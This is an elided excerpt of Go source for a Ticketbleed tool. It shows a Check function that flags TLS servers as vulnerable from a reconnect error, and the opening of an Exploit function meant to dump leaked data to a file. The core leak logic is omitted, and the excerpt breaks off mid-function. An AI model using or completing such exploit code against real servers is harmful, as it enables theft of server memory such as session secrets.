...
func Check(Target string) (string) {
	...
	Connect, ConErr := Dial("tcp", Target, conf)
	if ConErr != nil {
		return string("[-] Failed to connect: "+ConErr.Error())
	}
	Connect.Close()


	Connect, ConErr = Dial("tcp", Target, conf)
	if ConErr != nil && strings.Contains(ConErr.Error(), "unexpected message") {
		return string("[+] "+Target+" is vulnerable to Ticketbleed !")
	} else if ConErr != nil {
		return string("[-] Failed to reconnect: "+ConErr.Error())
	} else {
		Connect.Close()
		return string("[*] "+Target+" does NOT appear to be vulnerable :(")
	}

}


func Exploit(Target string, FileName string, Size int) {
	...
	Connect, ConErr := Dial("tcp", Target, conf)
	if ConErr != nil {
		fmt.Println("[-] Failed to connect:", ConErr)
		os.Exit(1)
	}
	Connect.Close()
	...
	if ConErr != nil && strings.Contains(ConErr.Error(), "unexpected message") {
		...
		fmt.Println("[-] Failed to reconnect:", ConErr)
		os.Exit(1)
	} else {
